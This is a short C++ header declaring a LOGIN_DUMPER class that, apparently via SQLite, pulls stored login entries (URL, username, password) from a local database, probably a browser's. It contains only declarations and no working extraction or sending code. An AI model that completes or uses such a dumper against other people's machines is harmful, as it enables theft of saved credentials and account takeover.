#pragma once
#ifndef LOGIN_DUMPER_H
#define LOGIN_DUMPER_H

#include "DUMPER.h"
#include <string>
#include <vector>
#include <winsqlite/winsqlite3.h>

// Structure to save a login entry
struct LOGIN_ENTRY {
  std::string URL;
  std::string Username;
  std::string Password;
};

// Class to dump login data
class LOGIN_DUMPER : public DUMPER {
private:
  std::vector<LOGIN_ENTRY> LoginData;
  static int __stdcall AddEntry(void *, int, char **, char **);

public:
  LOGIN_DUMPER() {}
  ~LOGIN_DUMPER() {}

  int Dump() override;
  int Show() override;
};

#endif // !LOGIN_DUMPER_H
